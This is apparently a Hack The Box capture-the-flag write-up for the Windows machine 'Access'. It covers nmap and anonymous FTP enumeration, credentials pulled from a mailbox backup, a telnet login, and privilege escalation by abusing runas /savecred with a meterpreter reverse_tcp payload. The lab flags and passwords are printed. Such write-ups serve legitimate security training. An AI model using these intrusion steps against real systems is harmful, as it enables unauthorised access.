# Access
>Author : Xyan1d3
>Date : 12th July 2021
>IP : 10.10.10.98
>OS : Windows
>Difficulty : Easy
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Mon Jul 12 20:30:41 2021 as: nmap -vvv -p 23,21,80 -A -oN nmap/rustscan 10.10.10.98
Nmap scan report for 10.10.10.98
Host is up, received echo-reply ttl 127 (0.062s latency).
Scanned at 2021-07-12 20:30:42 IST for 188s

PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet? syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp

Uptime guess: 0.003 days (since Mon Jul 12 20:29:09 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   60.94 ms 10.10.14.1
2   60.88 ms 10.10.10.98
```

## FTP Enumeration
We use ftp `anonymous` login and find out that we have two files.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/access]
└──╼ # ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> cd ../Engineer
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
```

We see that we have a `backup.mdb` which is an Microsoft Access Database File and an `Access Control.zip` which is an encrypted zip file.

Classic `zip2john.py` and `john` does not work on the `Access Control.zip`.
**We have to download the backup.mdb file from ftp by using binary mode.**

![[Pasted image 20210712225510.png]]

We now could use this credentials to unzip the zip file.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/access/ftp/engineer]
└──╼ # ls -l
total 328
-rw-r--r-- 1 root root 271360 Aug 24  2018 'Access Control.pst'
-rw-r--r-- 1 root root  10870 Jul 12 20:32 'Access Control.zip'
-rw-r--r-- 1 root root  43003 Jul 12 20:43  zip_hash
```
On unzipping we get an `Access Control.pst` which is an outlook mailbox backup.
We restore it on our own `evolution` sandbox mail client and get the mails.
![[Pasted image 20210712225722.png]]

We see that we have a credential pair.

# Initial FootHold as security
We have the credentials from the mailbox which we could use.

|Username|Password|
|--|--|
|security|4Cc3ssC0ntr0ller|

We use these credentials on the `23/tcp` or `telnet` to login to the server.
![[Pasted image 20210712230031.png]]

## Getting the user Flag
```python
C:\Users\security\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security\Desktop

07/12/2021  05:59 PM    <DIR>          .
07/12/2021  05:59 PM    <DIR>          ..
08/21/2018  11:37 PM                32 user.txt
               2 File(s)        784,416 bytes
               2 Dir(s)  16,745,127,936 bytes free

C:\Users\security\Desktop>type user.txt
ff1f3b48913b213a31ff6756d2553d38
```

# Root Escalation
We visit the `Public` user's desktop and find out that we have a lnk file named `ZKAccess3.5 Security System.lnk`.
```python
C:\Users\Public\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\Public\Desktop

08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
               1 File(s)          1,870 bytes
               0 Dir(s)  16,745,127,936 bytes free

C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
LF@ 7#P/PO :+00/C:\R1M:Windows:M:*wWindowsV1MVSystem32:MV*System32X2P:
                                                                       runas.exe:1:1*Yrunas.exeL-KEC:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico
```

We see that we have a `runas` command which runs `Access` as an administrator.
`runas` is actually like linux `sudo` but instead of running it on the same terminal it runs as another instance.
`Windows\System32\runas.exe C:\ZKTeco\ZKAccess3.5G /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe`

We could do something similar to this and for this I will be using `metasploit`.
I will be generating an `msfvenom` payload with `windows/x64/meterpreter/reverse_tcp` and transfered into the box to `C:\Temp\magisk.exe`

![[Pasted image 20210712231732.png]]

## Getting the root Flag
```python
meterpreter > dir
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2018-08-22 02:13:14 +0530  desktop.ini
100666/rw-rw-rw-  32    fil   2018-08-22 03:37:24 +0530  root.txt

meterpreter > cat root.txt
6e1586cc7ab230a8d297e8f933d904cf
```